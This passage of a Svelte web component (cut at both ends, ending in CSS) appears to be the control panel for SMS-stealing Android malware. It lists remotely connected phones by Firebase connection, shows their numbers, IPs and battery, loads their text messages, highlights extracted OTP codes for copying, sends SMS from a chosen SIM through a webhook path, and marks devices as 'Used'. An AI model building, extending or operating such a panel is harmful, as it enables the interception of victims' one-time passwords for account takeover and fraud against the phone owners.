        </div>
        <div class="ap-grid">
          <div class="field"><label for="fn">Name</label><input id="fn" bind:value={form.name} placeholder="project-name"/></div>
          <div class="field"><label for="fu">Firebase URL</label><input id="fu" bind:value={form.url} placeholder="https://xxx-default-rtdb.firebaseio.com"/></div>
          <div class="field"><label for="fp">Messages Path</label><input id="fp" bind:value={form.path} placeholder="messages"/></div>
          <div class="field"><label for="fi">Device Info Path</label><input id="fi" bind:value={form.infoPath} placeholder="devices (optional)"/></div>
          <div class="field"><label for="ft">Auth Token</label><input id="ft" type="password" bind:value={form.token} placeholder="optional"/></div>
        </div>
        <div class="ap-foot">
          <button class="btn btn-ghost" onclick={() => addOpen=false}>Cancel</button>
          <button class="btn btn-primary" onclick={addConn}>Connect</button>
        </div>
      </div>
    {/if}

    <!-- Raw drawer -->
    {#if rawOpen}
      <div class="raw-drawer">
        <div class="rd-top">
          <span class="rd-lbl">Raw Firebase Request</span>
          <select bind:value={rawConnId} class="tiny-sel">
            {#each connections as c (c.id)}<option value={c.id}>{c.name}</option>{/each}
          </select>
          <button class="ico-btn" onclick={() => rawOpen=false} aria-label="Close">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12"/></svg>
          </button>
        </div>
        <div class="rd-row">
          <select bind:value={rawMethod} class="method-sel">
            {#each ['GET','POST','PUT','PATCH','DELETE'] as m}<option value={m}>{m}</option>{/each}
          </select>
          <input class="rd-path" bind:value={rawPath} placeholder="path/to/node" aria-label="Firebase path"/>
          <button class="btn btn-primary btn-sm" onclick={sendRaw} disabled={rawLoading}>Send</button>
        </div>
        {#if ['POST','PUT','PATCH'].includes(rawMethod)}
          <textarea class="code" rows="3" bind:value={rawBody} style="resize:vertical;font-size:12px" aria-label="Request body"></textarea>
        {/if}
        {#if rawRes}
          <div style="display:flex;gap:8px;align-items:center">
            <span class="s-pill {rawRes.ok?'sp-ok':'sp-err'}">{rawRes.status}</span>
          </div>
          <pre class="json-view">{JSON.stringify(rawRes.data??rawRes,null,2).slice(0,2000)}</pre>
        {/if}
      </div>
    {/if}

    <!-- Tab bar -->
    <div class="tab-bar">
      <button class="tab {activeTab==='overview'?'active':''}" onclick={() => activeTab='overview'}>Overview</button>
      <button class="tab {activeTab==='device'?'active':''}"   onclick={() => switchTab('device')}   disabled={!selectedKey}>Device</button>
      <button class="tab {activeTab==='messages'?'active':''}" onclick={() => switchTab('messages')} disabled={!selectedKey}>Messages</button>
      <button class="tab {activeTab==='send'?'active':''}"     onclick={() => switchTab('send')}     disabled={!selectedKey}>Send SMS</button>
    </div>

    <!-- Tab content -->
    <div class="tab-body">

      <!-- ── OVERVIEW ──────────────────────────────────────────────────── -->
      {#if activeTab === 'overview'}

        <div class="live-card">
          <div class="lc-icon">
            <svg width="38" height="38" viewBox="0 0 32 32" fill="none">
              <rect x="2" y="4" width="28" height="20" rx="3" fill="rgba(249,115,22,0.12)" stroke="#f97316" stroke-width="1.2"/>
              <rect x="5" y="14" width="5" height="7" rx="1" fill="#f97316" opacity="0.9"/>
              <rect x="13" y="10" width="5" height="11" rx="1" fill="#38bdf8" opacity="0.9"/>
              <rect x="21" y="7" width="5" height="14" rx="1" fill="#22c55e" opacity="0.9"/>
            </svg>
          </div>
          <div>
            <div class="lc-title">Live Status</div>
            <div class="lc-sub">
              Total: {totalCount} &nbsp;·&nbsp; Online: {onlineCount} &nbsp;·&nbsp; Offline: {offlineCount}
            </div>
          </div>
        </div>

        <div class="stat-row">
          <div class="stat-card" style="border-top-color:#38bdf8"><div class="sc-n">{totalCount}</div><div class="sc-l">TOTAL</div></div>
          <div class="stat-card" style="border-top-color:#22c55e"><div class="sc-n" style="color:#22c55e">{onlineCount}</div><div class="sc-l">ONLINE</div></div>
          <div class="stat-card" style="border-top-color:#ef4444"><div class="sc-n" style="color:#ef4444">{offlineCount}</div><div class="sc-l">OFFLINE</div></div>
          <div class="stat-card" style="border-top-color:#a78bfa"><div class="sc-n" style="color:#a78bfa">{allDevices.filter(d=>d.info&&getSims(d.info)).length}</div><div class="sc-l">SIMS</div></div>
        </div>

        <div class="dt-card">
          <div class="dt-hdr">
            ALL DEVICES
            <div style="display:flex;gap:6px">
              {#each connStats as c}
                <span class="conn-badge" style="color:{c.color};border-color:{c.color}44">{c.name} {c.loading?'…':c.keyCount}</span>
              {/each}
            </div>
          </div>
          <div class="dt-scroll">
            <table class="dt-table">
              <thead><tr><th>STATUS</th><th>MODEL</th><th>NUMBER</th><th>BATTERY</th><th>SIMS</th><th></th></tr></thead>
              <tbody>
                {#each allDevices as d (d.connId+'::'+d.key)}
                  {@const on  = d.info ? isOnline(d.info) : null}
                  {@const bat = d.info ? getBattery(d.info) : null}
                  {@const fp  = d.info ? fmtPhone(d.info) : null}
                  {@const sc  = d.info ? getSims(d.info) : null}
                  <tr class="dt-row {selectedKey===d.key&&selectedConnId===d.connId?'dt-sel':''}"
                      onclick={() => selectDevice(d.connId, d.key)}>
                    <td>
                      <div class="td-st">
                        <span class="td-dot {on===true?'ton':on===false?'toff':'tunk'}"></span>
                        <span class="{on===true?'son':on===false?'soff':'sunk'}">{on===true?'Online':on===false?'Offline':'—'}</span>
                      </div>
                    </td>
                    <td><span class="mono td-key">{d.key}</span></td>
                    <td><span class="td-num">{fp??'—'}</span></td>
                    <td>{#if bat!==null}<b style="color:{batColor(bat)};font-family:'JetBrains Mono',monospace">{bat}%</b>{:else}<span style="color:#475569">—</span>{/if}</td>
                    <td><span style="color:#94a3b8">{sc??0}</span></td>
                    <td>
                      <button class="td-del" onclick={e=>{e.stopPropagation();deleteDevice(d.conn,d.key)}} title="Delete" aria-label="Delete">×</button>
                    </td>
                  </tr>
                {/each}
              </tbody>
            </table>
          </div>
        </div>

      <!-- ── DEVICE ────────────────────────────────────────────────────── -->
      {:else if activeTab === 'device'}
        {#if !selectedKey}
          <div class="no-sel">Select a device from the sidebar</div>
        {:else}
          {@const on  = selectedInfo ? isOnline(selectedInfo) : null}
          {@const bat = selectedInfo ? getBattery(selectedInfo) : null}

          <!-- Device header -->
          <div class="dv-card">
            <div class="dv-left">
              <div class="dv-ico">
                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.7">
                  <rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/>
                </svg>
              </div>
              <div>
                <div class="dv-id mono">{selectedKey}</div>
                <div style="display:flex;gap:8px;align-items:center;margin-top:6px;flex-wrap:wrap">
                  {#if on !== null}
                    <span class="ob {on?'ob-on':'ob-off'}">{on?'Online':'Offline'}</span>
                  {:else}
                    <span class="ob ob-unk">No device info</span>
                  {/if}
                  {#if selectedConn}
                    <span style="font-size:12px;color:{selectedConn.color}">· {selectedConn.name}</span>
                  {/if}
                </div>
              </div>
            </div>
            {#if bat !== null}
              <div class="dv-bat">
                <div class="dv-bat-n" style="color:{batColor(bat)}">{bat}%</div>
                <div class="dv-bat-l">BATTERY</div>
                <div class="bat-track"><div class="bat-fill" style="width:{bat}%;background:{batColor(bat)}"></div></div>
              </div>
            {/if}
          </div>

          <!-- Info grid -->
          {@const dispPhone = getDisplayPhone(selectedConnId, selectedKey, selectedInfo)}
          {#if selectedInfo || dispPhone}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId===selectedConnId && editingPhone.key===selectedKey}
                  <div class="phone-edit-row">
                    <input class="phone-edit-in" bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={e => e.key==='Enter' && commitPhone()}
                      aria-label="Phone number"/>
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}>Save</button>
                    <button class="btn btn-ghost btn-sm" onclick={() => editingPhone=null}>✕</button>
                  </div>
                {:else}
                  <div class="ib-v" style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">
                    <span>{dispPhone??'—'}</span>
                    {#if dispPhone}
                      <button class="af-cp" onclick={() => { const n=extractNumber(dispPhone); copyText(n); toast(`Copied: ${n}`,'success'); }} title="Copy 10-digit number" aria-label="Copy number">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      </button>
                    {/if}
                    <button class="edit-ph-btn" onclick={() => startEditPhone(selectedConnId, selectedKey)} title="Edit local number" aria-label="Edit phone">
                      {dispPhone ? '✏️' : '+ Add number'}
                    </button>
                  </div>
                {/if}
              </div>
              <div class="ib"><div class="ib-l">IP</div><div class="ib-v mono">{selectedInfo?getIp(selectedInfo)??'—':'—'}</div></div>
              <div class="ib"><div class="ib-l">ANDROID</div><div class="ib-v">{selectedInfo?getAndroid(selectedInfo)??'—':'—'}</div></div>
              <div class="ib"><div class="ib-l">SIMS</div><div class="ib-v">{selectedInfo?getSims(selectedInfo)??0:0}</div></div>
            </div>
          {:else}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId===selectedConnId && editingPhone.key===selectedKey}
                  <div class="phone-edit-row">
                    <input class="phone-edit-in" bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={e => e.key==='Enter' && commitPhone()}
                      aria-label="Phone number"/>
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}>Save</button>
                    <button class="btn btn-ghost btn-sm" onclick={() => editingPhone=null}>✕</button>
                  </div>
                {:else}
                  <div class="ib-v">
                    <button class="edit-ph-btn add-ph" onclick={() => startEditPhone(selectedConnId, selectedKey)}>+ Add local number</button>
                  </div>
                {/if}
              </div>
              <div class="ib"><div class="ib-l">IP</div><div class="ib-v" style="color:#334155">—</div></div>
              <div class="ib"><div class="ib-l">ANDROID</div><div class="ib-v" style="color:#334155">—</div></div>
              <div class="ib"><div class="ib-l">SIMS</div><div class="ib-v" style="color:#334155">—</div></div>
            </div>
          {/if}

          <!-- Action buttons + device used toggle -->
          {@const devUsedDetail = isUsed(`dev::${selectedConnId}::${selectedKey}`)}
          <div class="act-row">
            <button class="act-btn ab-msg" onclick={() => switchTab('messages')}>
              💬 Messages
            </button>
            <button class="act-btn ab-snd" onclick={() => switchTab('send')}>
              🚀 Send
            </button>
          </div>

          <!-- Device used checkbox -->
          <div class="dev-used-row">
            <label class="dev-used-label" for="dev-used-chk">
              <input id="dev-used-chk" type="checkbox" class="dev-check" checked={devUsedDetail}
                onchange={() => toggleUsed(`dev::${selectedConnId}::${selectedKey}`)}
                aria-label="Mark device used"/>
              <span>{devUsedDetail ? '✓ Marked as Used' : 'Mark as Used'}</span>
            </label>
          </div>
        {/if}

      <!-- ── MESSAGES ───────────────────────────────────────────────────── -->
      {:else if activeTab === 'messages'}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else if msgsLoading}
          <div class="no-sel"><div class="spin-ring"></div><p>Loading messages…</p></div>
        {:else if msgs === null}
          <div class="no-sel">
            <p>Click to load messages for <code class="mono">{selectedKey}</code></p>
            <button class="btn btn-primary" onclick={loadMessages}>Load Messages</button>
          </div>
        {:else}
          <div class="msg-topbar">
            <span class="msg-count">{filteredMsgs.length} / 50 messages</span>
            <div class="msg-search-wrap">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" opacity="0.4"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
              <input class="msg-search" bind:value={msgsSearch} placeholder="Search messages…" aria-label="Search messages"/>
            </div>
            <div class="msg-tabs">
              <button class="mtab {msgsFilter==='all'?'mta':''}" onclick={() => msgsFilter='all'}>All</button>
              <button class="mtab {msgsFilter==='in'?'mti':''}"  onclick={() => msgsFilter='in'}>In</button>
              <button class="mtab {msgsFilter==='out'?'mto':''}" onclick={() => msgsFilter='out'}>Out</button>
            </div>
            <button class="btn btn-ghost btn-sm" onclick={loadMessages}>↻</button>
          </div>

          {#if filteredMsgs.length === 0}
            <div class="no-sel" style="min-height:200px">
              <p style="color:#475569">No messages found{msgsSearch||msgsFilter!=='all'?' for this filter':''}</p>
            </div>
          {:else}
            <div class="msg-list">
              {#each filteredMsgs as [id, msg]}
                {@const msgText = msg.message??msg.body??msg.text??''}
                {@const otp = extractOTP(msgText)}
                <div class="msg-card">
                  <div class="mc-row">
                    <span class="mc-sender">{msg.sender??msg.from??'Unknown'}</span>
                    <span class="mc-badge {(msg.type||'incoming')==='incoming'?'badge-in':'badge-out'}">
                      {(msg.type||'incoming')==='incoming'?'Incoming':'Outgoing'}
                    </span>
                  </div>
                  <div class="mc-body">{msgText.slice(0, 80)}{msgText.length > 80 ? '…' : ''}</div>
                  {#if otp}
                    <div class="mc-otp" role="button" tabindex="0"
                      onclick={() => { copyText(otp); toast(`OTP ${otp} copied!`, 'success'); }}
                      onkeydown={e => e.key==='Enter' && (copyText(otp), toast(`OTP ${otp} copied!`,'success'))}
                      title="Click to copy OTP">
                      <span class="otp-label">OTP</span>
                      <code class="otp-code">{otp}</code>
                      <span class="otp-copy-hint">
                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      </span>
                    </div>
                  {/if}
                  <div class="mc-foot">
                    {#if msg.dateTime}<span class="mc-dt">{toIST(msg.dateTime)}</span>{/if}
                    <button class="af-cp" onclick={() => copyText(msgText)} title="Copy full message" aria-label="Copy message">
                      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                    </button>
                  </div>
                </div>
              {/each}
            </div>
          {/if}
        {/if}

      <!-- ── SEND SMS ───────────────────────────────────────────────────── -->
      {:else if activeTab === 'send'}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else}
          <div class="send-wrap">
            <div class="send-hdr">Send SMS</div>
            <div class="send-sub">via <span style="color:{selectedConn?.color}">{selectedConn?.name}</span> → <code class="mono">{selectedKey}</code></div>
            <div class="send-sub" style="margin-top:2px;font-size:10.5px;color:#475569;word-break:break-all;">
              📍 <code style="font-size:10px;color:#64748b">{selectedConn?.url}/clients/{selectedKey}/webhookEvent/sendSms</code>
            </div>
            <div class="send-form">
              <div class="field">
                <label for="sms-to">To (phone number)</label>
                <input id="sms-to" bind:value={smsDraft.to} placeholder="+91 XXXXX XXXXX"/>
              </div>
              <div class="field">
                <label for="sms-sim">SIM Slot</label>
                <select id="sms-sim" bind:value={smsDraft.sim} class="tiny-sel" style="font-size:13px;padding:8px 10px;">
                  <option value="0">SIM 1 (Slot 0)</option>
                  <option value="1">SIM 2 (Slot 1)</option>
                </select>
              </div>
              <div class="field">
                <label for="sms-msg">Message</label>
                <textarea id="sms-msg" rows="5" bind:value={smsDraft.body} placeholder="Type your message…"></textarea>
              </div>
              <button class="act-btn ab-snd" onclick={doSendSMS} disabled={smsSending||!smsDraft.to.trim()||!smsDraft.body.trim()}>
                {#if smsSending}<span class="spin-ring" style="width:14px;height:14px;border-width:2px"></span>
                {:else}🚀 Send SMS{/if}
              </button>
            </div>
          </div>
        {/if}
      {/if}
    </div>
  </div>
</div>

<!-- Notification stack -->
<div class="notif-stack">
  {#if notifications.length > 0}
    <div class="notif-scroll" use:dragScroll>
      {#each notifications as n (n.id)}
        {@const expanded = expandedNotifs.has(n.id)}
        {@const msgFull  = n.message ?? ''}
        {@const msgShort = msgFull.slice(0, 80) + (msgFull.length > 80 ? '…' : '')}
        <div class="notif {n.leaving?'nleave':''}">

          <!-- Top row: conn · device · time · ✕ -->
          <div class="n-top">
            <div class="n-ids">
              <span class="n-conn" style="color:{n.conn?.color??'#f97316'}">{(n.conn?.name??'?').toUpperCase()}</span>
              <span class="n-dev-wrap">
                <span class="n-dev mono">{n.devKey?.slice(0,16)??'?'}</span>
                <button class="n-dev-copy" onclick={() => { copyText(n.devKey??''); toast('Device ID copied','success'); }}
                  title="Copy device ID" aria-label="Copy device ID">
                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                </button>
              </span>
            </div>
            <div style="display:flex;align-items:center;gap:6px">
              <span class="n-time">{toIST(n.ts)}</span>
              <button class="n-close" onclick={() => dismissNotif(n.id)} aria-label="Dismiss">×</button>
            </div>
          </div>

          <!-- Sender name -->
          <div class="n-sender">{n.sender}</div>

          <!-- Message: always 2-line clamp inside fixed card height -->
          <div class="n-msg">{msgShort}</div>
          {#if msgFull.length > 80}
            <button class="n-expand-btn" onclick={() => {
              const s = new Set(expandedNotifs);
              expanded ? s.delete(n.id) : s.add(n.id);
              expandedNotifs = s;
            }}>
              {expanded ? '▲ less' : '▼ more'}
            </button>
          {/if}

          <!-- Spacer: pushes OTP bar to bottom of fixed-height card -->
          <div class="n-spacer"></div>

          <!-- OTP — pinned to bottom, always visible, tap to copy -->
          {#if n.otp}
            <div class="n-otp-row" role="button" tabindex="0"
              onclick={() => { copyText(n.otp); toast(`OTP ${n.otp} copied!`,'success'); }}
              onkeydown={e => e.key==='Enter' && copyText(n.otp)}
              title="Tap anywhere to copy OTP">
              <span class="n-otp-label">OTP</span>
              <code class="n-otp-code">{n.otp}</code>
              <svg class="n-otp-copy-ico" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </div>
          {/if}

        </div>
      {/each}
    </div>
    <!-- Clear all button -->
    <button class="notif-clear-all" onclick={clearAllNotifs}>
      Clear all {notifications.length} notification{notifications.length===1?'':'s'}
    </button>
  {/if}
</div>

<!-- Toasts -->
<div class="toast-stack">
  {#each toasts as t (t.id)}
    <div class="toast {t.type} {t.out?'out':''}">{t.msg}</div>
  {/each}
</div>

<style>
  * { box-sizing: border-box; }
  .shell { display:flex; height:100vh; overflow:hidden; background:#0b0e17; color:#e2e8f0; font-family:'Inter',system-ui,sans-serif; }

  /* ── SIDEBAR ─────────────────────────────────────────────────────────── */
  .sidebar { width:220px; flex-shrink:0; background:#0e1420; border-right:1px solid rgba(255,255,255,0.07); display:flex; flex-direction:column; height:100vh; overflow:hidden; }

  .side-brand { display:flex; align-items:center; gap:8px; padding:14px 14px 10px; border-bottom:1px solid rgba(255,255,255,0.06); flex-shrink:0; }
  .brand-txt { font-size:16px; font-weight:800; color:#f97316; letter-spacing:0.01em; }

  .side-search { display:flex; align-items:center; gap:6px; margin:8px 10px 4px; padding:7px 10px; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.07); border-radius:6px; flex-shrink:0; }
  .search-in { background:none; border:none; outline:none; font-size:12px; color:#e2e8f0; width:100%; font-family:inherit; }
  .search-in::placeholder { color:#475569; }

  .side-filter { display:flex; gap:4px; padding:0 10px 5px; flex-shrink:0; }
  .filt { flex:1; padding:5px 4px; border-radius:5px; border:1px solid rgba(255,255,255,0.08); background:transparent; color:#64748b; font-size:12px; font-weight:600; cursor:pointer; font-family:inherit; transition:all 120ms; }
  .filt:hover { color:#94a3b8; }
  .fa { background:#f97316!important; color:#fff!important; border-color:#f97316!important; }
  .fo { background:rgba(34,197,94,.18)!important; color:#22c55e!important; border-color:rgba(34,197,94,.4)!important; }
  .fx { background:rgba(239,68,68,.14)!important; color:#ef4444!important; border-color:rgba(239,68,68,.3)!important; }

  .dev-list { flex:1; overflow-y:auto; }
  .dev-list::-webkit-scrollbar { width:3px; }
  .dev-list::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.09); border-radius:99px; }

  .dev-item { display:flex; align-items:center; justify-content:space-between; padding:8px 10px 8px 12px; cursor:pointer; border-left:3px solid transparent; transition:background 80ms,border-color 80ms; }
  .dev-item:hover { background:rgba(255,255,255,0.04); }
  .dev-item.selected { background:rgba(249,115,22,0.09); border-left-color:#f97316; }
  .di-left { display:flex; align-items:center; gap:8px; min-width:0; flex:1; }
  .di-right { display:flex; align-items:center; gap:5px; flex-shrink:0; }
  .dev-check { width:13px; height:13px; accent-color:#f97316; cursor:pointer; flex-shrink:0; }
  .dev-used { opacity:0.45; }
  .dev-used .di-id { text-decoration:line-through; }
  .dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
  .dot-on  { background:#22c55e; box-shadow:0 0 5px rgba(34,197,94,.6); }
  .dot-off { background:#2d3748; }
  .dot-unk { background:#1e2a3a; border:1px solid #334155; }
  .di-id { font-size:11.5px; font-weight:600; color:#e2e8f0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .di-sub { font-size:10px; color:#64748b; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; margin-top:1px; }
  .bat-pill { font-size:11px; font-weight:700; padding:2px 6px; border-radius:4px; border:1px solid; flex-shrink:0; font-family:'JetBrains Mono',monospace; }
  .load-more { width:100%; padding:8px; font-size:11px; color:#f97316; background:none; border:none; border-top:1px solid rgba(255,255,255,0.05); cursor:pointer; font-family:inherit; transition:background 120ms; }
  .load-more:hover { background:rgba(249,115,22,0.06); }
  .list-empty { padding:20px; text-align:center; font-size:12px; color:#334155; }

  .side-footer { border-top:1px solid rgba(255,255,255,0.07); padding:8px 10px; flex-shrink:0; }
  .sf-hdr { font-size:9px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#334155; margin-bottom:5px; }
  .conn-scroll {
    max-height: calc(22px * 10 + 5px); /* 10 rows max */
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: thin;
    scrollbar-color: rgba(255,255,255,0.1) transparent;
    user-select: none;
  }
  .conn-scroll::-webkit-scrollbar { width:3px; }
  .conn-scroll::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.12); border-radius:3px; }
  .conn-row { display:flex; align-items:center; gap:5px; padding:3px 2px; }
  .cr-dot { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
  .cr-name { font-size:11px; color:#94a3b8; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .cr-cnt { font-size:10px; font-weight:700; font-family:'JetBrains Mono',monospace; }
  .cr-tog { width:26px; height:14px; border-radius:7px; border:none; cursor:pointer; position:relative; transition:background 200ms; flex-shrink:0; }
  .cr-tog.ton  { background:#f97316; }
  .cr-tog.toff { background:#1e293b; border:1px solid #334155; }
  .cr-knob { position:absolute; top:1px; width:12px; height:12px; background:white; border-radius:50%; transition:left 200ms; }
  .cr-tog.ton  .cr-knob { left:13px; }
  .cr-tog.toff .cr-knob { left:1px; }
  .cr-rm { background:none; border:none; color:#475569; font-size:15px; cursor:pointer; width:18px; height:18px; display:flex; align-items:center; justify-content:center; border-radius:3px; padding:0; font-family:inherit; transition:all 120ms; line-height:1; }
  .cr-rm:hover { color:#ef4444; background:rgba(239,68,68,0.1); }
  .add-fb-btn { display:flex; align-items:center; gap:6px; width:100%; margin-top:8px; padding:7px 8px; border-radius:6px; border:1px dashed rgba(249,115,22,0.3); background:transparent; color:#f97316; font-size:11.5px; font-weight:600; cursor:pointer; font-family:inherit; transition:all 140ms; }
  .add-fb-btn:hover { background:rgba(249,115,22,0.08); border-color:#f97316; }

  /* ── MAIN ────────────────────────────────────────────────────────────── */
  .main { flex:1; display:flex; flex-direction:column; min-width:0; overflow:hidden; }

  .topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:44px; background:#0e1420; border-bottom:1px solid rgba(255,255,255,0.07); flex-shrink:0; gap:10px; }
  .tb-l { display:flex; align-items:center; gap:10px; min-width:0; }
  .refresh-cd { font-size:11px; color:#334155; font-family:'JetBrains Mono',monospace; }
  .bg-refresh { display:flex; align-items:center; gap:5px; color:#34d399; }
  .bg-dot { width:6px; height:6px; border-radius:50%; background:#34d399; display:inline-block; animation:bg-pulse 1.2s ease-in-out infinite; box-shadow:0 0 6px rgba(52,211,153,0.7); }
  @keyframes bg-pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.7)} }
  .tb-r { display:flex; align-items:center; gap:8px; flex-shrink:0; }
  .tbstat { font-size:12px; font-weight:700; padding:3px 10px; border-radius:20px; white-space:nowrap; }
  .tt { background:rgba(255,255,255,0.06); color:#94a3b8; border:1px solid rgba(255,255,255,0.1); }
  .to { background:rgba(34,197,94,0.14); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .tf { background:rgba(239,68,68,0.1); color:#ef4444; border:1px solid rgba(239,68,68,0.25); }
  .ico-btn { width:30px; height:30px; display:flex; align-items:center; justify-content:center; border-radius:6px; border:1px solid rgba(255,255,255,0.1); background:rgba(255,255,255,0.04); color:#64748b; cursor:pointer; transition:all 140ms; font-family:inherit; }
  .ico-btn:hover { color:#e2e8f0; border-color:rgba(255,255,255,0.2); background:rgba(255,255,255,0.08); }
  .ico-active { color:#f97316!important; border-color:rgba(249,115,22,0.4)!important; background:rgba(249,115,22,0.08)!important; }
  .ico-muted  { color:#ef4444!important; border-color:rgba(239,68,68,0.35)!important; background:rgba(239,68,68,0.08)!important; }
  .notif-clear-btn { display:flex; align-items:center; gap:3px; width:auto!important; padding:0 8px!important; color:#f97316!important; border-color:rgba(249,115,22,0.35)!important; }

  .add-panel { background:#0e1420; border-bottom:1px solid rgba(255,255,255,0.07); padding:14px 20px; flex-shrink:0; }
  .ap-hdr { display:flex; align-items:center; justify-content:space-between; margin-bottom:10px; font-size:13px; font-weight:600; }
  .ap-grid { display:grid; grid-template-columns:1fr 2fr 1fr 1fr 1fr; gap:10px; }
  .ap-foot { display:flex; justify-content:flex-end; gap:8px; margin-top:10px; }

  .raw-drawer { background:#0a0d16; border-bottom:1px solid rgba(255,255,255,0.07); padding:12px 20px; display:flex; flex-direction:column; gap:10px; flex-shrink:0; max-height:40vh; overflow-y:auto; }
  .rd-top { display:flex; align-items:center; gap:10px; }
  .rd-lbl { font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; color:#64748b; flex:1; }
  .rd-row { display:flex; gap:8px; align-items:center; }
  .method-sel { font-family:'JetBrains Mono',monospace; font-size:12px; font-weight:700; color:#f97316; background:#0d1117; border:1px solid rgba(255,255,255,0.1); border-radius:5px; padding:7px 8px; cursor:pointer; outline:none; }
  .rd-path { flex:1; font-family:'JetBrains Mono',monospace; font-size:12px; }
  .s-pill { display:inline-flex; font-size:11px; font-weight:600; padding:2px 8px; border-radius:4px; }
  .sp-ok  { background:rgba(34,197,94,0.12); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .sp-err { background:rgba(239,68,68,0.1); color:#ef4444; border:1px solid rgba(239,68,68,0.25); }
  .tiny-sel { background:#0d1117; border:1px solid rgba(255,255,255,0.1); border-radius:5px; padding:5px 8px; font-size:12px; color:#e2e8f0; cursor:pointer; outline:none; font-family:inherit; }

  .tab-bar { display:flex; background:#0e1420; border-bottom:2px solid rgba(255,255,255,0.07); flex-shrink:0; padding:0 18px; gap:2px; }
  .tab { padding:10px 18px; font-size:13px; font-weight:500; color:#64748b; background:none; border:none; border-bottom:2px solid transparent; margin-bottom:-2px; cursor:pointer; font-family:inherit; transition:all 130ms; white-space:nowrap; }
  .tab:hover:not(:disabled) { color:#94a3b8; }
  .tab.active { color:#f97316; border-bottom-color:#f97316; }
  .tab:disabled { opacity:.3; cursor:not-allowed; }

  .tab-body { flex:1; overflow-y:auto; padding:18px 22px 40px; display:flex; flex-direction:column; gap:14px; }
  .tab-body::-webkit-scrollbar { width:5px; }
  .tab-body::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.09); border-radius:99px; }

  .no-sel { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:14px; color:#475569; font-size:14px; min-height:220px; }

  /* OVERVIEW */
  .live-card { display:flex; align-items:center; gap:14px; background:#141b2d; border:1px solid rgba(249,115,22,0.2); border-top:3px solid #f97316; border-radius:10px; padding:14px 18px; }
  .lc-icon { width:52px; height:52px; background:rgba(249,115,22,0.08); border:1px solid rgba(249,115,22,0.2); border-radius:10px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
  .lc-title { font-size:17px; font-weight:700; color:#f97316; }
  .lc-sub { font-size:12px; color:#94a3b8; margin-top:3px; }
  .stat-row { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; }
  .stat-card { background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-top:3px solid; border-radius:10px; padding:16px 18px; }
  .sc-n { font-size:38px; font-weight:800; font-family:'JetBrains Mono',monospace; line-height:1; letter-spacing:-0.03em; }
  .sc-l { font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; margin-top:4px; }
  .dt-card { background:#141b2d; border:1px solid rgba(255,255,255,0.07); border-radius:10px; overflow:hidden; }
  .dt-hdr { padding:9px 14px; font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#64748b; border-bottom:1px solid rgba(255,255,255,0.07); display:flex; justify-content:space-between; align-items:center; }
  .conn-badge { font-size:9.5px; font-weight:700; padding:2px 7px; border-radius:4px; border:1px solid; }
  .dt-scroll { overflow-x:auto; max-height:460px; overflow-y:auto; }
  .dt-table { width:100%; border-collapse:collapse; font-size:12.5px; }
